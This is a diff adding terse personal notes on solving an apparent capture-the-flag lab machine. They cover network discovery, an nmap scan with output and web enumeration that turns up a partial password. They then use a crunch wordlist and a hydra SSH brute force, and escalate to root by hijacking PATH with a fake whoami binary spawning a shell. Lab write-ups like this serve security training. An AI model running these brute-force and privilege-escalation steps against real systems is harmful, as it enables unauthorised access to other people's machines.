@@ -1,0 +1,80 @@
+ifconfig, myIP -> 192.168.56.125
+
+netdiscover -r 192.168.56.0/24 -i eth1
+	vuln machine IP -> 192.168.56.113
+
+nmap -sC -sV -A -T4 -p- 192.168.56.113 -oN nmap.scan
+	# Nmap 7.80 scan initiated Mon Sep 23 19:17:51 2019 as: nmap -sC -sV -A -T4 -p- -oN 		nmap.scan 192.168.56.113
+	Nmap scan report for 192.168.56.113
+	Host is up (0.022s latency).
+	Not shown: 65533 closed ports
+	PORT   STATE SERVICE VERSION
+	22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+	| ssh-hostkey: 
+	|   2048 49:e6:fa:4c:d5:60:06:3b:c0:a8:c9:cc:00:10:7e:04 (RSA)
+	|   256 29:1b:39:69:32:aa:ae:9f:72:83:29:d4:27:db:f8:af (ECDSA)
+	|_  256 a0:05:9e:82:bc:9d:09:ce:8e:c5:40:b2:b2:93:c6:53 (ED25519)
+	80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+	| http-robots.txt: 1 disallowed entry 
+	|_/notes.txt
+	|_http-server-header: Apache/2.4.25 (Debian)
+	|_http-title: Apache2 Debian Default Page: It works
+	MAC Address: 08:00:27:47:DC:4A (Oracle VirtualBox virtual NIC)
+	Device type: general purpose
+	Running: Linux 3.X|4.X
+
+Start with 80, run a dirb and nikto while exploring it
+	dirb http://192.168.56.113/
+	nikto -h 192.168.56.113
+
+dirb finds a robots and notes, lets look at robots first
+192.168.56.113/robots.txt
+	finds notes.txt
+192.168.56.113/notes.txt
+Translating the note to english says:
+	I absolutely have to remove the password from the page, after all, the last 2 characters 	are missing. But still.
+
+So let's go back to the home page and look at the source code
+
+First glance I don't see anything standing out, let's look a the js code
+192.168.56.113/script.js -> s1lKy
+
+Now we need to generate the last two characters, let's use crunch
+
+
+Made a huge wordlist with several crunch commands, but the one that works is
+
+crunch 7 7 -t s1lKy^% > pass.wd
+
+Now we have passwords, let's brute force the ssh now
+
+hydra -l silky -P pass.wd 192.168.56.113 ssh
+	-> s1lKy#5
+
+let's login
+	ssh silky@192.168.56.113
+	pass:s1lKy#5
+
+now we're in. Nothing found while enumerating around, let's check permissions and see if anything is root
+
+find / -user root -perm -4000 2>/dev/null
+
+/usr/bin/sky -> wtf is this?
+
+running /usr/bin/sky prints some german crap but also prints root
+
+lets strings the file: strings /usr/bin/sky
+we see it runs the whoami command
+let's make our own whoami command which spawns a shell and add it to our path
+
+cd /tmp
+echo "/bin/sh" > whoami
+chmod +x whoami
+export PATH=/tmp:$PATH
+/usr/bin/sky
+
+boom spawns a root shell
+cd /root
+cat flag.txt
+
+gg ez
